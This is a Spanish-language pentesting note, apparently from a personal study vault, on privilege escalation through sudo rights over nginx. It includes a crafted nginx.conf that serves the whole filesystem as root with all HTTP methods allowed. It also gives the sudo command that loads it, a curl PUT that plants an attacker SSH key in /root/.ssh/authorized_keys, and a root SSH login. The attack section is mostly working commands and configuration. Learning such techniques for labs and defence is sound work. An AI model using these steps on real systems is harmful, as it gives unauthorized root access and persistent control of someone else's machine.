# Abusing web server configuration

Esta técnica implica abusar de herramientas que nos permiten crear servidores web como Nginx o Apache en caso de poder ejecutar como *root* estas, al ejecutar `sudo -l` veríamos que podemos ejecutar estas herramientas o mismo por alguna mala configuración que estas herramientas cuenten con permisos [[0. Linux Basics#SUID (Set User ID)]], etc. 

Al poder ejecutar como root este tipo de herramientas podríamos crear un archivo de configuración para posteriormente cargarlo y exponer en un nuevo puerto la raíz del sistema, donde adicionalmente podríamos permitir métodos http como *PUT* o *POST* para, por ejemplo, dirigirnos a la ruta del directorio ssh de root (*/root/.ssh/*) y crear o editar el archivo *authorized_keys* donde cargariamos una clave pública de nuestra máquina de atacantes para así poder ganar acceso al sistema sin necesidad de proporcionar credenciales.

---
# Exploit

Una vez habiendo obtenido acceso al sistema, una de las primeras cosas que se nos vienen a la cabeza por validar estando en búsqueda de una vía potencial para escalar privilegios es verificar los permisos de ejecución que podría tener el usuario con el comando:

```bash
sudo -l
```

Una vez ejecutado el comando, visualizariamos aquellas configuraciones del archivo */etc/sudoers* donde los administradores del sistema insertaran aquellos binarios que podemos ejecutar como distintos usuarios indicando si será necesario ingresar credenciales o no, etc. En este caso, validando estas permisos, podríamos ver un output similar a este:

```bash
.....
User dobliuw may run the following commands on hostname:
    (ALL:ALL) nginx
......
```

En este ejemplo, podemos ver que el usuario actual *dobliuw* puede ejectuar como cualquier usuario (Incluyendo *root*) sin proporcionar contraseña la herramienta *nginx*. Entendiendo esto podemos visualizar el panel de ayuda de esta herramienta:

```bash
nginx -h

......
Options:
.......
  -c filename   : set configuration file (default: /etc/nginx/nginx.conf)
.......
```

De esta manera vemos que la herramienta cuenta con una opción para indicar un archivo de configuración, por lo que podríamos intentar crear unarchivo de configuración tomando de guía el archivo por defecto */etc/nginx/nginx.conf* y haciendo uso de google podríamos buscar como realizar ciertas acciones que nos podrían interesar, como permitir el *dorectory listing*, como permitir métodos http como *PUT* o *POST*, etc.

```bash
nano /tmp/nginx.conf
```

- nginx.conf
```bash
user root; # This indicate that the server will run under the user root management

events {
	worker_connections 768;
}

http {
	server {
		listen  4444; # If we write localhost:4444 this wouldn't open to everyone, just for de machin itself
		root /; # Expose the path / 
		autoindex on; # Allow directory listing
		allow_methods ".*"; # Allow all http methods (GET, POST, PUT, etc)
	}
}
```

Una vez creado el archivo de configuración deseado, simplemente deberíamos abusar de nuestra posibilidad de ejecutar, por ejemplo, como cualquier usuario la herramienta *nginx* y cargar este archivo de configuración "malicioso" haciendo uso de la flag *-c*

```bash
sudo -u root nginx -c /tmp/nginx.conf
```

Hecho esto, estariamos exponiendo bajo el puerto indicado (*4444*) la raíz del sistema ( */* ) permitiendo todos los métodos http, por lo que podríamos realizar una solicitud curl para modificar o crear el archivo **authorized_keys** adjuntando en este nuestra clave ssh pública para posteriormente ganar acceso al sistema sin proporcionar credenciales.

```bash
curl -s -X PUT http://{target_ip}:4444/root/.ssh/authorized_keys -d "{ssh_key.pub}"
```

Una vez realizado esto, habríamos modificado el archivo authorized keys adjunto en el directorio root del sistema, lo que nos permitirá ingresar al sistema como root sin proporcionar contraseña gracias a tener nuestra clave pública adjunta en dicho archivo. ([[0. Linux Basics#Keys in SSH]])

```bash
ssh root@{target_ip}
```

Esta es solo una manera en la cual podríamos ganar acceso al sistema, pero podemos tener en cuenta que las posibilidades son muchas, como desplegar una *web shell*, llevar a cabo un *log poisoning* ([[LFI - (Local File Inclusion)#Log Poisoning - ( **LFI** migrado a RCE - (Remote Command Execution) )]] ), podríamos crear un proxy inverso para interceptar tráfico, etc.
